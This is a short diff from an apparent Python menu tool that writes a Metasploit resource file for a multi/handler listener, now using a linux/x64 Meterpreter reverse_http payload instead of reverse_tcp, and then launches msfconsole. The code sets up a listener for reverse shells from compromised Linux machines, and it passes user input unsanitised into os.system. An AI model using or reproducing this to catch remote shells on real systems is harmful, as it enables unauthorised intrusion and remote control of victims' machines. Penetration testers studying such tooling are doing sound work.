@@ -43,7 +43,7 @@ def li64_http():
     os.system("echo 'use exploit/multi/handler' >> linux64_http.rb")
     os.system("echo 'set LHOST "+ip+"' >> linux64_http.rb")
     os.system("echo 'set LPORT "+port+"' >> linux64_http.rb")
-    os.system("echo 'set PAYLOAD linux/x64/meterpreter/reverse_tcp' >> linux64_http.rb")
+    os.system("echo 'set PAYLOAD linux/x64/meterpreter/reverse_http' >> linux64_http.rb")
     os.system("echo 'run' >> linux64_http.rb")
     os.system("gnome-terminal -- msfconsole -r linux64_http.rb &")
     input("Enter to return to the menu! ")
